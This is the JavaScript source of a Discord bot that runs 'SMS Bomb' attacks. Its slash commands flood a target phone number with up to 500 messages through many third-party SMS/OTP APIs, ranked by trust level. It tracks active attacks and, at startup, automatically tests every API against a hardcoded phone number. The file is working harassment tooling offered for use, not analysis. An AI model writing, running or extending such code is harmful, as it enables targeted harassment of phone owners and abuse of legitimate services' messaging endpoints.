const { Client, GatewayIntentBits, EmbedBuilder, SlashCommandBuilder } = require('discord.js');
const config = require('./config.json');
const { initApiStatus, sendFast, sendSlow, testApi, getApiList, cleanPhone, API_CONFIG } = require('./sms.js');
const fs = require('fs');
const path = require('path');

// ==========================================
// 🎨 COLOR SYSTEM
// ==========================================
const C = {
  GREEN: '\x1b[32m\x1b[1m',
  RED: '\x1b[31m\x1b[1m',
  YELLOW: '\x1b[33m\x1b[1m',
  CYAN: '\x1b[36m\x1b[1m',
  MAGENTA: '\x1b[35m\x1b[1m',
  RESET: '\x1b[0m'
};

// ==========================================
// 🤖 DISCORD CLIENT
// ==========================================
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

// Active attacks tracker
const activeAttacks = new Map();

// ==========================================
// 📝 SLASH COMMANDS DEFINITION
// ==========================================
const commands = [
  new SlashCommandBuilder()
    .setName('fast')
    .setDescription('SMS Bomb (Fast Mode)')
    .addStringOption(opt => opt.setName('phone').setDescription('Target phone number').setRequired(true))
    .addIntegerOption(opt => opt.setName('amount').setDescription('Number of SMS').setRequired(true))
    .addStringOption(opt =>
      opt.setName('level')
        .setDescription('API level to use')
        .setRequired(false)
        .addChoices(
          { name: '🟢 A - Best (High Trust)', value: 'A' },
          { name: '🟡 B - Good Trust', value: 'B' },
          { name: '🟠 C - Medium Trust', value: 'C' },
          { name: '🔴 D - Low Trust (may fake)', value: 'D' },
          { name: '🌟 ALL - Use all APIs', value: 'ALL' }
        )
    ),
    
  new SlashCommandBuilder()
    .setName('slow')
    .setDescription('SMS Bomb (Slow Mode)')
    .addStringOption(opt => opt.setName('phone').setDescription('Target phone number').setRequired(true))
    .addIntegerOption(opt => opt.setName('amount').setDescription('Number of SMS').setRequired(true))
    .addStringOption(opt =>
      opt.setName('level')
        .setDescription('API level to use')
        .setRequired(false)
        .addChoices(
          { name: '🟢 A - Best (High Trust)', value: 'A' },
          { name: '🟡 B - Good Trust', value: 'B' },
          { name: '🟠 C - Medium Trust', value: 'C' },
          { name: '🔴 D - Low Trust (may fake)', value: 'D' },
          { name: '🌟 ALL - Use all APIs', value: 'ALL' }
        )
    ),
    
  new SlashCommandBuilder()
    .setName('sms')
    .setDescription('SMS Bomb (Standard Mode)')
    .addStringOption(opt => opt.setName('phone').setDescription('Target phone number').setRequired(true))
    .addIntegerOption(opt => opt.setName('amount').setDescription('Number of SMS').setRequired(true))
    .addStringOption(opt =>
      opt.setName('level')
        .setDescription('API level to use')
        .setRequired(false)
        .addChoices(
          { name: '🟢 A - Best (High Trust)', value: 'A' },
          { name: '🟡 B - Good Trust', value: 'B' },
          { name: '🟠 C - Medium Trust', value: 'C' },
          { name: '🔴 D - Low Trust (may fake)', value: 'D' },
          { name: '🌟 ALL - Use all APIs', value: 'ALL' }
        )
    ),
    
  new SlashCommandBuilder()
    .setName('stop')
    .setDescription('Stop all active attacks'),
    
  new SlashCommandBuilder()
    .setName('test')
    .setDescription('Test single API (smart detection)')
    .addStringOption(opt =>
      opt.setName('api')
        .setDescription('API key to test (e.g. kex-express, freshket)')
        .setRequired(true)
    )
    .addStringOption(opt => opt.setName('phone').setDescription('Test phone number').setRequired(true))
    .addBooleanOption(opt => opt.setName('debug').setDescription('Show full debug info').setRequired(false)),
    
  new SlashCommandBuilder()
    .setName('apis')
    .setDescription('List all available APIs with levels')
];

// ==========================================
// 🚀 REGISTER SLASH COMMANDS TO ALL GUILDS
// ==========================================
async function registerCommands() {
  const { REST } = require('@discordjs/rest');
  const { Routes } = require('discord-api-types/v10');
  
  const rest = new REST({ version: '10' }).setToken(config.token);
  
  console.log(`${C.CYAN}⚡ Registering slash commands to ALL guilds...${C.RESET}`);
  
  try {
    const guilds = client.guilds.cache;
    console.log(`${C.YELLOW}Found ${guilds.size} guild(s)${C.RESET}`);
    
    let registeredCount = 0;
    
    for (const [guildId, guild] of guilds) {
      try {
        await rest.put(
          Routes.applicationGuildCommands(config.clientId, guildId),
          { body: commands.map(cmd => cmd.toJSON()) }
        );
        console.log(`${C.GREEN}✅ ${guild.name} (${guildId})${C.RESET}`);
        registeredCount++;
      } catch (err) {
        console.log(`${C.RED}❌ ${guild.name}: ${err.message}${C.RESET}`);
      }
    }
    
    console.log(`${C.GREEN}🔥 Done! Commands registered to ${registeredCount} guild(s) — ready instantly!${C.RESET}`);
    
  } catch (err) {
    console.error(`${C.RED}Failed to register commands: ${err.message}${C.RESET}`);
  }
}

// ==========================================
// 💬 CREATE STATUS EMBED
// ==========================================
function createStatusEmbed(phone, amount, mode, sent, failed, apis, level) {
  const progress = amount > 0 ? Math.round((sent / amount) * 100) : 0;
  const progressBar = '█'.repeat(Math.floor(progress / 5)) + '░'.repeat(20 - Math.floor(progress / 5));
  
  let apiText = 'None yet';
  if (Array.isArray(apis) && apis.length > 0) {
    apiText = apis.slice(0, 10).join(', ') + (apis.length > 10 ? ` +${apis.length - 10} more` : '');
  } else if (apis && typeof apis === 'object' && Object.keys(apis).length > 0) {
    const entries = Object.entries(apis).filter(([k, count]) => count > 0);
    apiText = entries.slice(0, 10).map(([k, v]) => `${k}:${v}`).join(', ');
    if (entries.length > 10) apiText += ` +${entries.length - 10} more`;
  }
  
  const levelDisplay = level || 'ALL';
  
  return new EmbedBuilder()
    .setTitle(`⚡ SMS Bomb Status`)
    .setColor(progress >= 100 ? 0x00ff00 : 0x0099ff)
    .addFields(
      { name: '📞 Target', value: `\`${phone}\``, inline: true },
      { name: '✅ Sent', value: `${sent} / ${amount}`, inline: true },
      { name: '⏱️ Mode', value: mode.toUpperCase(), inline: true },
      { name: '🎯 Level', value: levelDisplay, inline: true },
      { name: '📊 Progress', value: `\`${progressBar}\` ${progress}%`, inline: false },
      { name: '📡 APIs Hit', value: apiText, inline: false }
    )
    .setTimestamp();
}

// ==========================================
// 🎯 HANDLE /sms, /fast, /slow
// ==========================================
async function handleSmsCommand(interaction, mode) {
  const phone = cleanPhone(interaction.options.getString('phone'));
  const amount = Math.min(interaction.options.getInteger('amount'), 500);
  const level = interaction.options.getString('level') || 'ALL';
  
  if (phone.length !== 10) {
    return interaction.reply({ content: '❌ Invalid phone number (must be 10 digits)', ephemeral: true });
  }
  
  if (interaction.user.id !== config.ownerId) {
    return interaction.reply({ content: '❌ Only owner can use this command', ephemeral: true });
  }
  
  if (activeAttacks.has(interaction.user.id)) {
    return interaction.reply({ content: '❌ Already running an attack! Use /stop first', ephemeral: true });
  }
  
  await interaction.deferReply();
  
  const attackId = `${interaction.user.id}_${Date.now()}`;
  activeAttacks.set(interaction.user.id, attackId);
  
  const statusEmbed = createStatusEmbed(phone, amount, mode, 0, 0, [], level);
  const statusMsg = await interaction.editReply({ embeds: [statusEmbed] });
  
  console.log(`${C.CYAN}[${mode.toUpperCase()}] ${interaction.user.tag} → ${phone} x${amount} | Level: ${level}${C.RESET}`);
  
  const statusUpdate = async (sent, failed, apis) => {
    if (activeAttacks.get(interaction.user.id) !== attackId) return false;
    
    const embed = createStatusEmbed(phone, amount, mode, sent, failed, apis, level);
    try {
      await statusMsg.edit({ embeds: [embed] });
    } catch (e) {}
    return true;
  };
  
  let result;
  if (mode === 'fast') {
    result = await sendFast(phone, amount, statusUpdate, false, level);
  } else if (mode === 'slow') {
    result = await sendSlow(phone, amount, statusUpdate, level);
  } else {
    result = await sendFast(phone, amount, statusUpdate, false, level);
  }
  
  activeAttacks.delete(interaction.user.id);
  
  const finalEmbed = createStatusEmbed(phone, amount, mode, result.success, result.failed, result.apis, level);
  finalEmbed.setTitle('🏁 SMS Bomb Complete');
  finalEmbed.setColor(0x00ff00);
  
  await statusMsg.edit({ embeds: [finalEmbed] }).catch(() => {});
  
  const apisArray = result.apis ? Object.entries(result.apis).filter(([k,c]) => c > 0).map(([k,v]) => `${k}:${v}`) : [];
  console.log(`${C.GREEN}[DONE] Sent ${result.success} SMS via: ${apisArray.join(', ') || 'none'}${C.RESET}`);
}

// ==========================================
// 🛑 HANDLE /stop
// ==========================================
async function handleStop(interaction) {
  const userId = interaction.user.id;
  
  if (!activeAttacks.has(userId)) {
    return interaction.reply({ content: '❌ No active attack to stop', ephemeral: true });
  }
  
  activeAttacks.delete(userId);
  await interaction.reply({ content: '✅ Stopped all active attacks.', ephemeral: false });
}

// ==========================================
// 🧪 HANDLE /test (with smart detection)
// ==========================================
async function handleTest(interaction) {
  const apiKey = interaction.options.getString('api');
  const phone = cleanPhone(interaction.options.getString('phone'));
  const debug = interaction.options.getBoolean('debug') || false;
  
  if (phone.length !== 10) {
    return interaction.reply({ content: '❌ Invalid phone number', ephemeral: true });
  }
  
  if (!API_CONFIG[apiKey]) {
    const apiList = getApiList().slice(0, 20).map(a => `\`${a.key}\``).join(', ');
    return interaction.reply({ 
      content: `❌ Unknown API key: \`${apiKey}\`\n\nAvailable keys (first 20): ${apiList}${getApiList().length > 20 ? `\n... and ${getApiList().length - 20} more` : ''}`,
      ephemeral: true 
    });
  }
  
  await interaction.reply({ content: `🧪 Testing ${API_CONFIG[apiKey]?.name || apiKey}... (smart detection)`, ephemeral: true });
  
  const result = await testApi(apiKey, phone, debug);
  
  const embed = new EmbedBuilder()
    .setTitle(`🧪 Test Result: ${API_CONFIG[apiKey]?.name || apiKey}`)
    .setColor(result.success ? 0x00ff00 : 0xff0000)
    .addFields(
      { name: '📞 Phone', value: phone, inline: true },
      { name: '✅ Result', value: result.success ? '✅ SUCCESS (detected)' : '❌ FAILED', inline: true },
      { name: '⏱️ Latency', value: `${result.latency || 0}ms`, inline: true },
      { name: '🎯 Level', value: API_CONFIG[apiKey]?.level || '?', inline: true }
    )
    .setTimestamp();
  
  if (!result.success) {
    embed.addFields({ name: '❌ Error', value: result.error || 'Unknown', inline: false });
  }
  
  if (debug && result.responseBody) {
    const body = result.responseBody.length > 1000 ? result.responseBody.substring(0, 1000) + '...' : result.responseBody;
    embed.addFields({ name: '📄 Response Preview', value: `\`\`\`json\n${body}\n\`\`\``, inline: false });
  }
  
  await interaction.editReply({ embeds: [embed] });
}

// ==========================================
// 📋 HANDLE /apis
// ==========================================
async function handleApis(interaction) {
  const apiList = getApiList();
  
  const chunkSize = 25;
  const chunks = [];
  for (let i = 0; i < apiList.length; i += chunkSize) {
    chunks.push(apiList.slice(i, i + chunkSize));
  }
  
  const embeds = chunks.map((chunk, index) => {
    const levelEmoji = { A: '🟢', B: '🟡', C: '🟠', D: '🔴' };
    return new EmbedBuilder()
      .setTitle(`📡 Available APIs (${index + 1}/${chunks.length})`)
      .setColor(0x0099ff)
      .setDescription(chunk.map((a, i) => {
        const emoji = levelEmoji[a.level] || '❓';
        return `**${index * chunkSize + i + 1}.** ${emoji} ${a.name} (\`${a.key}\`) [${a.level}]`;
      }).join('\n'))
      .setFooter({ text: '🟢A 🟡B 🟠C 🔴D — Trust level (A = best)' })
      .setTimestamp();
  });
  
  if (embeds.length === 0) {
    return interaction.reply({ content: 'No APIs available.', ephemeral: true });
  }
  
  await interaction.reply({ embeds: embeds, ephemeral: true });
}

// ==========================================
// 🤖 AUTO-TEST ALL APIs (ตอนรันบอท)
// ==========================================
async function autoTestAllApis() {
  const testPhone = '0837595819'; // เปลี่ยนเป็นเบอร์ที่ต้องการทดสอบ
  const apiKeys = Object.keys(API_CONFIG);
  const results = [];
  const total = apiKeys.length;
  let completed = 0;

  console.log(`${C.CYAN}════════════════════════════════════════════════════════════${C.RESET}`);
  console.log(`${C.CYAN}🧪 AUTO-TEST STARTING — Testing ${total} APIs...${C.RESET}`);
  console.log(`${C.CYAN}📞 Test phone: ${testPhone}${C.RESET}`);
  console.log(`${C.CYAN}⏱️  This may take a few minutes...${C.RESET}`);
  console.log(`${C.CYAN}════════════════════════════════════════════════════════════${C.RESET}`);

  // ทดสอบทีละ 5 ตัว เพื่อไม่ให้ overload
  const batchSize = 5;
  for (let i = 0; i < apiKeys.length; i += batchSize) {
    const batch = apiKeys.slice(i, i + batchSize);
    const batchPromises = batch.map(async (key) => {
      const cfg = API_CONFIG[key];
      const startTime = Date.now();
      let result = {
        key: key,
        name: cfg.name || key,
        level: cfg.level || '?',
        url: typeof cfg.url === 'function' ? cfg.url(testPhone) : cfg.url,
        method: cfg.method || 'GET',
        headers: cfg.headers ? cfg.headers() : {},
        payload: cfg.data ? cfg.data(testPhone) : null,
        dataType: cfg.dataType || 'none',
        timestamp: new Date().toISOString(),
        success: false,
        statusCode: null,
        responseBody: null,
        responseTruncated: false,
        latency: 0,
        error: null,
        fullResponse: null
      };

      try {
        const axios = require('axios');
        const axiosConfig = {
          method: cfg.method || 'GET',
          url: result.url,
          headers: result.headers,
          timeout: 15000
        };

        if (result.payload) {
          if (cfg.dataType === 'json') {
            axiosConfig.data = result.payload;
          } else if (cfg.dataType === 'form') {
            axiosConfig.data = result.payload;
            axiosConfig.headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
          } else {
            axiosConfig.data = result.payload;
          }
        }

        const resp = await axios(axiosConfig);
        const latency = Date.now() - startTime;
        result.latency = latency;
        result.statusCode = resp.status;

        const body = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);
        result.fullResponse = body;

        if (body.length > 2000) {
          result.responseBody = body.substring(0, 2000) + '... [truncated]';
          result.responseTruncated = true;
        } else {
          result.responseBody = body;
        }

        // ใช้ smartSuccessCheck
        const success = cfg.successCheck(body, key);
        result.success = success;

      } catch (err) {
        result.latency = Date.now() - startTime;
        result.statusCode = err.response?.status || null;
        result.error = err.message;
        if (err.response?.data) {
          const body = typeof err.response.data === 'string' ? err.response.data : JSON.stringify(err.response.data);
          result.fullResponse = body;
          if (body.length > 2000) {
            result.responseBody = body.substring(0, 2000) + '... [truncated]';
            result.responseTruncated = true;
          } else {
            result.responseBody = body;
          }
        }
        result.success = false;
      }

      completed++;
      const progress = Math.round((completed / total) * 100);
      const statusIcon = result.success ? '✅' : '❌';
      const levelEmoji = { A: '🟢', B: '🟡', C: '🟠', D: '🔴' }[result.level] || '❓';
      console.log(`${C.YELLOW}[${completed}/${total}] ${statusIcon} ${levelEmoji} ${result.name} (${result.key}) — ${result.success ? 'SUCCESS' : 'FAILED'} ${result.latency ? `(${result.latency}ms)` : ''}${C.RESET}`);

      return result;
    });

    const batchResults = await Promise.allSettled(batchPromises);
    for (const br of batchResults) {
      if (br.status === 'fulfilled') {
        results.push(br.value);
      } else {
        results.push({
          key: 'unknown',
          name: 'Unknown',
          level: '?',
          success: false,
          error: `Promise rejected: ${br.reason}`,
          timestamp: new Date().toISOString()
        });
      }
    }

    // รอระหว่าง batch เพื่อไม่ให้โดน rate limit
    if (i + batchSize < apiKeys.length) {
      await new Promise(r => setTimeout(r, 1000));
    }
  }

  // สรุปผล
  const successCount = results.filter(r => r.success === true).length;
  const failCount = results.filter(r => r.success === false).length;
  const summary = {
    timestamp: new Date().toISOString(),
    total: total,
    success: successCount,
    failed: failCount,
    successRate: total > 0 ? Math.round((successCount / total) * 100) : 0,
    testPhone: testPhone
  };

  // จัดกลุ่มตาม Level
  const byLevel = {};
  for (const r of results) {
    const level = r.level || '?';
    if (!byLevel[level]) byLevel[level] = { total: 0, success: 0, failed: 0 };
    byLevel[level].total++;
    if (r.success) byLevel[level].success++;
    else byLevel[level].failed++;
  }

  const output = {
    summary: summary,
    byLevel: byLevel,
    results: results
  };

  // บันทึกไฟล์
  const filePath = path.join(__dirname, 'test.json');
  fs.writeFileSync(filePath, JSON.stringify(output, null, 2), 'utf8');
  console.log(`${C.GREEN}📁 Test results saved to: ${filePath}${C.RESET}`);

  // แสดงสรุป
  console.log(`${C.CYAN}════════════════════════════════════════════════════════════${C.RESET}`);
  console.log(`${C.GREEN}✅ AUTO-TEST COMPLETE!${C.RESET}`);
  console.log(`${C.YELLOW}📊 Total: ${total} | ✅ Success: ${successCount} | ❌ Failed: ${failCount} | 📈 Rate: ${summary.successRate}%${C.RESET}`);
  console.log(`${C.CYAN}📊 By Level:${C.RESET}`);
  for (const [level, stats] of Object.entries(byLevel)) {
    const emoji = { A: '🟢', B: '🟡', C: '🟠', D: '🔴' }[level] || '❓';
    console.log(`  ${emoji} Level ${level}: ${stats.success}/${stats.total} (${Math.round((stats.success/stats.total)*100)}%)`);
  }
  console.log(`${C.CYAN}════════════════════════════════════════════════════════════${C.RESET}`);
}

// ==========================================
// 🚀 BOT READY
// ==========================================
client.once('ready', async () => {
  console.log(`${C.GREEN}✅ Logged in as ${client.user.tag}${C.RESET}`);
  console.log(`${C.YELLOW}Servers: ${client.guilds.cache.size}${C.RESET}`);
  
  initApiStatus();
  await registerCommands();
  
  console.log(`${C.GREEN}🔥 Bot is ready!${C.RESET}`);
  
  // 🔥 เริ่ม Auto-Test ทันที (ไม่รอ)
  setTimeout(async () => {
    await autoTestAllApis();
  }, 3000);
});

// ==========================================
// 📨 HANDLE INTERACTIONS
// ==========================================
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;
  
  const { commandName } = interaction;
  
  try {
    switch (commandName) {
      case 'fast':
        await handleSmsCommand(interaction, 'fast');
        break;
      case 'slow':
        await handleSmsCommand(interaction, 'slow');
        break;
      case 'sms':
        await handleSmsCommand(interaction, 'standard');
        break;
      case 'stop':
        await handleStop(interaction);
        break;
      case 'test':
        await handleTest(interaction);
        break;
      case 'apis':
        await handleApis(interaction);
        break;
    }
  } catch (err) {
    console.error(`${C.RED}Command error: ${err.message}${C.RESET}`);
    if (interaction.replied || interaction.deferred) {
      await interaction.editReply({ content: `❌ Error: ${err.message}` }).catch(() => {});
    } else {
      await interaction.reply({ content: `❌ Error: ${err.message}`, ephemeral: true }).catch(() => {});
    }
  }
});

// ==========================================
// 🔐 LOGIN
// ==========================================
client.login(config.token).catch(err => {
  console.error(`${C.RED}❌ Login failed: ${err.message}${C.RESET}`);
  process.exit(1);
});